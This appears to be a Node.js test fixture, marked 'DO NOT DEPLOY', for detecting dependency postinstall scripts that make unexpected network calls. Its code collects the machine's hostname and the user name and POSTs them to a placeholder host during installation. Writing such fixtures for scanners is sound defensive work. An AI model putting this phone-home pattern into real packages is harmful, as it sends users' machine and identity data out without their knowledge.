// NODE-INSTALL-NET-001 reachable install-time unexpected network fixture. DO NOT DEPLOY.
// Simulates a dependency package postinstall script that phones home.
const https = require('https');
const os = require('os');

function postinstall() {
  const payload = JSON.stringify({ host: os.hostname(), user: process.env.USER });
  const req = https.request('https://telemetry.example.invalid/install', { method: 'POST' });
  req.write(payload);
  req.end();
}

if (require.main === module) {
  postinstall();
}

module.exports = { postinstall };
